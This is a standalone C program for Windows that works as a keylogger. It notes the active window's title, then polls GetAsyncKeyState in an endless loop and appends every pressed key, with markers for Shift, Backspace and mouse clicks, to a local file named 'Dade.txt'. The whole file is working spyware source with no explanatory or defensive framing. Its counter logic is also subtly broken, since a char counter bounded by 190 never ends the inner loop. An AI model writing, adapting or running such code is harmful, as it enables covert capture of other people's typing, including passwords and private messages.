#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#define BUFSIZE 1024

int main() {
    char keystroke;
    FILE *logfile;
    char filename[] = "Dade.txt";
    HWND hwnd = GetForegroundWindow();
    char window_title[BUFSIZE];
    GetWindowText(hwnd, window_title, BUFSIZE);

    if ((logfile = fopen(filename, "a")) == NULL) {
        printf("Error opening log file.");
        exit(1);
    }

    fprintf(logfile, "\n\nWindow: %s\n", window_title);
    fprintf(logfile, "--------------------------------------------\n");

    while (1) {
        Sleep(10);
        for (keystroke = 8; keystroke <= 190; keystroke++) {
            if (GetAsyncKeyState(keystroke) == -32767) {
                if (keystroke == VK_SHIFT) {
                    fprintf(logfile, "%s", "[SHIFT]");
                }
                else if (keystroke == VK_BACK) {
                    fprintf(logfile, "%s", "[BACKSPACE]");
                }
                else if (keystroke == VK_LBUTTON) {
                    fprintf(logfile, "%s", "[LBUTTON]");
                }
                else if (keystroke == VK_RBUTTON) {
                    fprintf(logfile, "%s", "[RBUTTON]");
                }
                else {
                    fprintf(logfile, "%c", keystroke);
                }
            }
        }
    }

    fclose(logfile);
    return 0;
}
